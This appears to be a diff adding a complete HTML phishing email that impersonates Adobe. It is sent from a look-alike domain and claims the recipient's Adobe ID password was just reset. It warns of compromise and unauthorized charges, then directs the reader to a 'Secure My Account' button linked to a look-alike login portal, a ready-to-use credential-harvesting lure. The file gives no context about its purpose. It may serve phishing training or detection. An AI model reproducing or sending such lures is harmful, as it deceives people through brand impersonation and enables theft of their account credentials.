@@ -1,0 +1,22 @@
+From: "Adobe Cloud Security" <noreply@adobe-security-update.com>
+To: user@example.com
+Subject: Security Alert: Your Adobe ID password has been reset
+Date: Wed, 25 Feb 2026 10:15:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset="UTF-8"
+
+<div style="background: #fcfcfc; font-family: Helvetica, Arial, sans-serif; max-width: 600px; margin: auto; border: 1px solid #eeeeee;">
+  <div style="background: #ff0000; height: 5px;"></div>
+  <div style="padding: 40px;">
+    <div style="margin-bottom: 30px;">
+      <img src="https://img.icons8.com/color/96/adobe.png" alt="Adobe" style="width: 40px;">
+    </div>
+    <h1 style="color: #333; font-size: 24px; font-weight: 900; margin-bottom: 25px;">Did you just reset your password?</h1>
+    <p style="color: #666; font-size: 16px; line-height: 1.6;">Your Adobe ID password was changed at <b>10:12 AM GMT</b>. If you initiated this change, you can safely ignore this email.</p>
+    <div style="background: #fff5f5; border: 1px solid #fed7d7; padding: 20px; border-radius: 6px; margin: 30px 0;">
+      <p style="color: #e53e3e; margin: 0; font-weight: bold;">If you didn't change your password:</p>
+      <p style="color: #718096; margin: 10px 0 0 0; font-size: 14px;">Your account may have been compromised. Click the button below immediately to secure your Adobe ID and prevent unauthorized charges.</p>
+    </div>
+    <a href="http://adobe-security-login-portal.net" style="background: #0265d2; color: white; padding: 14px 40px; border-radius: 99px; text-decoration: none; font-weight: bold; display: inline-block;">Secure My Account</a>
+  </div>
+</div>
